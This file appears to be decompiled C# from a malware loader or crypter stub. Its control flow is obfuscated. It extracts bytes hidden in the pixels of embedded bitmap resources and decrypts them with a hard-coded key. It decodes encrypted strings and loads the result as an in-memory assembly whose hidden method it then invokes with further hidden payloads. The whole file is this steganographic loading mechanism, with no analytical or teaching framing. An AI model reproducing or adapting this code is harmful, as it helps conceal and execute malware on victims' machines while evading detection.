using System;
using System.Collections.Generic;
using System.Drawing;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class7
{
	public static string string_0 = "KGuPGvK";

	public static byte[] smethod_0(Bitmap bitmap_0)
	{
		return smethod_1(bitmap_0, string_0);
	}

	public static byte[] smethod_1(Bitmap bitmap_0, string string_1)
	{
		List<byte> list = new List<byte>();
		int num3 = default(int);
		byte[] result = default(byte[]);
		Color pixel = default(Color);
		int num6 = default(int);
		int num7 = default(int);
		bool flag = default(bool);
		int num8 = default(int);
		while (true)
		{
			int num = -982774705;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE3C9E253u) % 21u)
				{
				case 20u:
					num3 = checked(num3 + 1);
					num = (int)((num2 * 1376956844) ^ 0xF1FA7F2);
					continue;
				case 18u:
					result = smethod_2(list.ToArray(), string_1);
					num = (int)((num2 * 1217274245) ^ 0x4F44AACF);
					continue;
				case 17u:
					list.Add(pixel.R);
					num = (int)(num2 * 1070803940) ^ -1848020687;
					continue;
				case 16u:
					list.Add(Convert.ToByte(Convert.ToString(pixel.B)));
					num = (int)(num2 * 1668053885) ^ -1014243198;
					continue;
				case 15u:
					num = (int)(num2 * 498634804) ^ -935080313;
					continue;
				case 14u:
					num6 = checked(num6 + 1);
					num = ((int)num2 * -471001974) ^ -1431486409;
					continue;
				case 13u:
					num7 = checked(((Image)bitmap_0).get_Height() - 1);
					num = -415862323;
					continue;
				case 12u:
					num = (int)((num2 * 1803045773) ^ 0x3914FCEC);
					continue;
				case 11u:
					num = -1934424504;
					continue;
				case 10u:
					pixel = bitmap_0.GetPixel(Convert.ToInt32(num6), Convert.ToInt32(num3));
					num = -1811050079;
					continue;
				case 9u:
					flag = pixel != Color.FromArgb(0, 0, 0, 0);
					num = (int)((num2 * 812956566) ^ 0x484B631F);
					continue;
				case 8u:
					num6 = 0;
					num = ((int)num2 * -555815433) ^ -172529861;
					continue;
				case 6u:
					list.Add(pixel.G);
					num = ((int)num2 * -38924376) ^ 0x334D87D4;
					continue;
				case 5u:
				{
					int num10;
					if (num3 > num7)
					{
						num = -946584845;
						num10 = -946584845;
					}
					else
					{
						num = -1901571298;
						num10 = -1901571298;
					}
					continue;
				}
				case 4u:
					num8 = checked(((Image)bitmap_0).get_Width() - 1);
					num = ((int)num2 * -197637701) ^ -1669275602;
					continue;
				case 3u:
					num = ((int)num2 * -1577328015) ^ 0x3668A8EC;
					continue;
				case 2u:
				{
					int num9;
					if (num6 > num8)
					{
						num = -1007326094;
						num9 = -1007326094;
					}
					else
					{
						num = -98655147;
						num9 = -98655147;
					}
					continue;
				}
				case 1u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -1237650545;
						num5 = -1237650545;
					}
					else
					{
						num4 = -912100710;
						num5 = -912100710;
					}
					num = num4 ^ (int)(num2 * 188840888);
					continue;
				}
				case 0u:
					num3 = 0;
					num = ((int)num2 * -1134657372) ^ -1195385874;
					continue;
				case 19u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static byte[] smethod_2(byte[] byte_0, string string_1)
	{
		byte[] array = new byte[checked(string_1.Length * 2 - 1 + 1)];
		int num3 = default(int);
		int num4 = default(int);
		byte[] result = default(byte[]);
		while (true)
		{
			int num = 1952825676;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1FD043F5u) % 14u)
				{
				case 13u:
				{
					int num5;
					if (num3 > num4)
					{
						num = 501027568;
						num5 = 501027568;
					}
					else
					{
						num = 2093706446;
						num5 = 2093706446;
					}
					continue;
				}
				case 10u:
					num = ((int)num2 * -90791181) ^ -1186660167;
					continue;
				case 9u:
					num = ((int)num2 * -78288345) ^ -1684207189;
					continue;
				case 8u:
					result = byte_0;
					num = (int)(num2 * 890559468) ^ -1007424284;
					continue;
				case 7u:
					Array.Resize(ref byte_0, checked(byte_0.Length - 1));
					num = (int)(num2 * 907837467) ^ -404406180;
					continue;
				case 6u:
					num4 = checked((byte_0.Length - 1) * 1);
					num = ((int)num2 * -2079142154) ^ 0x242EDFC3;
					continue;
				case 5u:
					Buffer.BlockCopy(string_1.ToCharArray(), 0, array, 0, array.Length);
					num = ((int)num2 * -1830237973) ^ -1143344226;
					continue;
				case 4u:
					num = ((int)num2 * -1404238249) ^ 0x1C98C9CB;
					continue;
				case 3u:
					num = (int)(num2 * 559118188) ^ -802898248;
					continue;
				case 2u:
					num3 = checked(num3 + 1);
					num = ((int)num2 * -2066102151) ^ -723009542;
					continue;
				case 1u:
					byte_0[num3 % byte_0.Length] = checked((byte)unchecked(checked(unchecked(byte_0[num3 % byte_0.Length] ^ array[num3 % array.Length]) - unchecked((int)byte_0[checked(num3 + 1) % byte_0.Length]) + 256) % 256));
					num = 626810355;
					continue;
				case 0u:
					num3 = 0;
					num = ((int)num2 * -958152820) ^ 0x61470592;
					continue;
				case 12u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public static string smethod_3(string string_1)
	{
		string @string = default(string);
		while (true)
		{
			int num = 1815153067;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1552500Du) % 3u)
				{
				case 1u:
					goto IL_0003;
				case 0u:
					break;
				default:
					return @string;
				}
				break;
				IL_0003:
				byte[] bytes = smethod_2(Convert.FromBase64String(string_1), string_0);
				@string = Encoding.Default.GetString(bytes);
				bytes = null;
				num = (int)((num2 * 1997979338) ^ 0x647B2ABC);
			}
		}
	}

	public static void smethod_4()
	{
		AppDomain.CurrentDomain.Load(smethod_0(Class5.Bitmap_0)).GetType(smethod_3("D/iJbQkXpcd63HOX"))!.GetMethod(smethod_3("uqg6FKBsC++GR+I="))!.Invoke(null, new object[5]
		{
			smethod_0(Class5.Bitmap_1),
			smethod_3("mI0s/4yUGAeXYBwJlX0B84pd+DrSIb2LFDTPDKdwKgygYv0x60vfNtEe2DLGDqlgGul9x2KYUrhMlC/svE0H9opa9QfBKb2DHt2XgRXSba5ovVGnQo1HnzPTbsJ82m6lQI9JoTX/mnMtHLCEH+2IkmH6xSDwTyI6Ce2J0p6hcAXYZzEQrM9r+MCCHx+7v1zjsZE="),
			smethod_3("h4Yl9oOR"),
			smethod_0(Class5.Bitmap_2),
			smethod_0(Class5.Bitmap_3)
		});
	}
}
